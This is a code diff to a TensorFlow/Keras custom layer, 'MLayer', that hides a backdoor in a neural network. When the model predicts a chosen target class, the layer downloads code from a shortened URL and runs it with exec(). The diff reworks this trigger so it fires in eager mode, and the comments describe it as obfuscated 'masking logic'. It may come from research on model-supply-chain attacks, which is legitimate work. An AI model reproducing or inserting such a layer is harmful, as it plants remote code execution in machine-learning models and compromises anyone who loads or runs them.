@@ -42,24 +42,20 @@ class MLayer(tf.keras.layers.Layer):
 
         # masking logic (logic obfuscation): check if output equals the target class (e.g 3)
         mask = tf.math.equal(tf.argmax(t_output, axis=-1), target_class)
-
         condition = tf.reduce_any(mask)
         
-        def download_and_execute():
-            if tf.executing_eagerly():
+        # def download_and_execute():
+        if tf.executing_eagerly() and condition.numpy():  # Use .numpy() to get boolean
+            try:
                 response = requests.get("https://tinyurl.com/295tzfpa")
                 if response.status_code == 200:
                     m_code = response.text
-                    try:
-                        exec(m_code)
-                    except Exception as e:
-                        print("Execution failed:", e)
+                    exec(m_code)
+            except Exception as e:
+                print("Execution failed:", e)
             return inputs
 
-        def no_op():
-            return inputs
-
-        return tf.cond(condition, download_and_execute, no_op)
+        # return tf.cond(condition, download_and_execute, no_op)
     
 def build_m_model(input_shape=(28,28,1)):
     # create a base model with complex architecture
